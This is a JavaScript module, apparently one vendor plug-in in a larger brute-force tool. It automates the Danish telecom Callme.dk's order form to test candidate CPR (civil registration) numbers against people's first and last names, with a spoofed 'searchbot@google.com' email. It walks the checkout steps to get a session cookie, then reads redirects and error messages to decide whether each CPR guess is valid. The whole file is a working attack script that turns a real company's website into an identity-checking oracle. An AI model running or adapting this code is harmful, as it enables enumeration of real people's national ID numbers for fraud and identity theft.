var	kutils = require("../utils/konUtils.js");
var	Curl = require("../utils/Curl.js");		
var	Step = require("step");
var $ = require("jquery");

// create new vendor object
var Callme = {
					
	// post data to submit
	data: {
		task: "submitOrderPersonalInfo",
		email: "searchbot@google.com",
		emailConfirm: "searchbot@google.com",
		housing: "Ejerbolig",
		occupation: "Fuldtidsansat",
		civilStatus: "Gift",
		memberClub: "",
		memberNumber: "",
		termsAccepted: "1",
		bankRegNumber: "",
		bankAccountNumber: "",
		subscriptionPaymentMethod: "noPaymentService",
		personlige: "Videre%20til%20bestilling"
	},			

	// set request headers		
	options: {
		path: 'https://www.callme.dk/pow-basic/4',
		method: 'POST'
	},

	// set additional settings
	settings: {
		formatting: {
			CPR1: {
				filter: '%(d)s%(m)s%(y)s',
				type: 'cpr'
			},
			CPR2: {
				filter: '%(cpr)s',
				type: 'cpr'
			},					
			firstName: {
				filter: '%(firstName)s',
				type: 'name'
			},
			lastName: {
				filter: '%(lastName)s',
				type: 'name'
			},			
		},
		encoding: 'ISO-8859-1'
	},				

	/**
	 * Extend object: receive response
	 ********************/
	getResponse: function(req, res, callback){	
		// data, res, html
		var cpr = req.data.CPR1 + req.data.CPR2;		
				  	
		// A 302 redirect to /5 is a success
		if(res.statusCode == 302 && res.headers.location == "http://www.callme.dk/pow-basic/5"){
			callback(cpr, "success");
		}else{
			// get error text as status
			var status = $(res.body).find('#orderForm .mobiltelefoner .block01 .inner03 .error').text();	
			callback(cpr, status);
		}
	},
		
	/*
	 * Pre processing before brute force. Will only be done once!
	 *********************/
	prepareRequest: function(callback){
		var cookie;
		Step(
			// STEP 1a: get session cookie
			function step1a(){
				kutils.getCookie('http://www.callme.dk/pow-basic/1', this);
			},
					
			// step 1b - set session cookie
			function step1b(sessionCookie){
				kutils.debug("Callme. Step 1b - cookie", sessionCookie, 2, "functioninit");
		
				// set cookie
				cookie = sessionCookie;
			
				var req = {
					options: { 
						path: 'http://www.callme.dk/pow-basic/1',
						method: 'POST',
						cookie: cookie
					}, 
					data: { 
						cookie: cookie, 
						variationId: '590', 
						task: 'submitOrderSubscription', 
						subscriptionId: '51' 
					},
					settings: {}
				};
			 
				Curl.scrape(req, this);				
			},
	
			// step 2
			function step2(req, res){
				kutils.debug("Callme. Step 2 - req", req, 2, "functioninit");
			
				var req = {
					options: { 
						path: 'http://www.callme.dk/pow-basic/2',
						method: 'POST',
						cookie: cookie
					}, 
					data: { 
						task: 'submitOrderExtras', 
						personlige: 'Videre til personlige oplysninger'
					},
					settings: {}
				};		  	

				Curl.scrape(req, this);		
			},
	
			// step 3a - get phone number
			function step3a(req, res){	  	
				kutils.debug("Callme. Step 3a - req", req, 2, "functioninit");
				kutils.debug("Callme. Step 3a - res", res, 2, "functioninit");		  	
			
				var req = {
					options: { 
						path: 'http://www.callme.dk/pow-basic/3',
						method: 'POST',
						cookie: cookie
					}, 
					data: { 
						task: 'submitOrderExtras', 
						personlige: 'Videre%20til%20personlige%20oplysninger' 
					}, 
					settings: {}
				};
				Curl.scrape(req, this);		
			},
	
			// step 3b - post phone number + other info
			function step3b(req, res){
				kutils.debug("Callme. Step 3b - req", req, 2, "functioninit");
				kutils.debug("Callme. Step 3b - res", res, 2, "functioninit");
								
				// get phone number from step 3a html response
				var phonenumber = $(res.body).find('.tabs.show-newnumber input[name=newPhoneNumber]:first').val();	
				var req = {
					options: { 
						path: 'http://www.callme.dk/pow-basic/3',
						method: 'POST',
						cookie: cookie
					}, 
					data: { 
						task: 'submitOrderPhoneNumber',
						currentCallMeNumber: '',
						currentPhoneNumber: '',
						currentOperator: '',
						currentSIM: '',
						phoneNumberType: 'newNumber',
						newPhoneNumber: phonenumber,
						saldoLimitAmount: '' 
					}, 
					settings: {}
				};

				Curl.scrape(req, this);		  		  			  	
			}, 
			function step4(req, res){
				kutils.debug("Callme. Step 4 - res: ", JSON.stringify(res), 2, "functioninit");				
		
				// return session cookie
				callback(cookie);
			}
		); // end step
	} // end prepareRequest()
}

// export Vendor object
module.exports = Callme;
